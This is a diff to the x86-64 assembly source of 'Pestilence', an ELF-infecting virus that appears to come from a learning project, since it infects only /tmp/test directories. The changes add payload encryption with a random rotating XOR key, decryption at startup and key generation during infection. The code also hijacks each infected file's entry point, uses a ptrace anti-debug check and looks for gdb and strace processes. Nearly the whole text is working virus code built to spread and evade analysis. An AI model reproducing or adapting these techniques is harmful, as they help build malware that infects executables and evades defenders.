@@ -8,8 +8,16 @@ _start:
 		mov rax, SYSCALL_FORK
 		syscall
 		cmp rax, 0
-		jnz jumpToHost
+		jz .saveState
 
+; Get address of host entry and jump to it [Parent]
+.jumpToHost:
+		lea rax, [rel _start]
+		sub rax, [rel payloadEntry]
+		add rax, [rel hostEntry]
+		jmp rax
+
+.saveState:
 		; Save common registers
 		push rdi
 		push rsi
@@ -19,12 +27,23 @@ _start:
 		; Allocate space in stack for pestilence struct
 		enter s_pestilence_size, 0
 
+.decryptPayload:
+		lea rdi, [rel _start.antiDebugMeasures]
+		mov rsi, ENCRYPTION_SIZE
+		mov rdx, [rel encryptionKey]
+
+		cmp rdx, 0
+		je .antiDebugMeasures
+		call rotativeXOR
+
+.encryptionStart:
+.antiDebugMeasures:
 		; Simple Anti Debug
 		mov rax, SYSCALL_PTRACE
 		xor rdi, rdi
 		syscall
 		cmp rax, -1
-		je antiDebugging
+		je noDebugAllowed
 
 		call findDaemonProcess
 		cmp rax, 0
@@ -123,20 +142,13 @@ die:
 		mov rdi, 0
 		syscall
 
-antiDebugging:
+noDebugAllowed:
 		mov rax, SYSCALL_WRITE
 		mov rdi, 1
 		lea rsi, [rel debugMessage]
 		mov rdx, DEBUG_MESSAGE_SIZE
 		syscall
 		jmp finish
-
-; Get address of host entry and jump to it [Parent]
-jumpToHost:
-		lea rax, [rel _start]
-		sub rax, [rel payloadEntry]
-		add rax, [rel hostEntry]
-		jmp rax
 
 
 ; * * * * * * * * * * * * * * * * * * * * * * *
@@ -380,7 +392,26 @@ injectVirus:
 		; Edit file entry to payload start (virtual address)
 		mov qword [r8 + elf64_ehdr.e_entry], rsi
 
-		; Adjust file sizes
+; RDI => End of payload
+.generateEncryptionKey:
+		mov rax, SYSCALL_GETRANDOM
+		lea rdi, [rdi - 24]
+		mov rsi, 8
+		xor rdx, rdx
+		syscall
+
+; RDI => Address of encrytion key
+.encryptPayload:
+		mov rdx, [rdi]
+
+		mov rdi, r8
+		add rdi, VALUE(s_pestilence.file_size)
+		add rdi, (_start.encryptionStart - _start)
+
+		mov rsi, ENCRYPTION_SIZE
+		call rotativeXOR
+
+.updateFileSize:
 		add qword VALUE(s_pestilence.file_size), PAGE_SIZE
 
 .return:
@@ -604,13 +635,34 @@ ft_memmem:
 		pop r8
 		ret
 
-data:
-	signature: db "Pestilence v1.0 (c)oded by tblaudez", 0
-	infectDirectories: db "/tmp/test/", 0, "/tmp/test2/", 0, 0
-	processDirectory: db "/proc/", 0
-	processStatFile: db "/comm", 0
-	daemonName: db "daemon", 0, "gdb", 0, "strace", 0, 0
-	debugMessage: db "DEBUGGING", 0
-	payloadEntry: dq _start
-	hostEntry: dq die
+; This data will be encrypted so we can't read it
+infectDirectories: db "/tmp/test/", 0, "/tmp/test2/", 0, 0
+processDirectory: db "/proc/", 0
+processStatFile: db "/comm", 0
+daemonName: db "daemon", 0, "gdb", 0, "strace", 0, 0
+debugMessage: db "DEBUGGING", 0
+
+; Encryption ends here
+encryptionEnd:
+
+; * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *
+; Encrypt part of the payload using XOR encryption with a random rotating key *
+; This function have to remain un-encrypted so it can be used for decryption  *
+; RDI => start address | RSI => size | RDX => encryption key                  *
+; * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *
+rotativeXOR:
+	mov rcx, rsi
+.startEncrypt:
+	xor byte [rdi], dl
+	ror rdx, 8
+	inc rdi
+	loop .startEncrypt
+.done:
+	ret
+
+; This data has to stay un-encrypted
+signature: db "Pestilence v1.0 (c)oded by tblaudez", 0
+encryptionKey: dq 0x000000000000000
+payloadEntry: dq _start
+hostEntry: dq die
 _end:
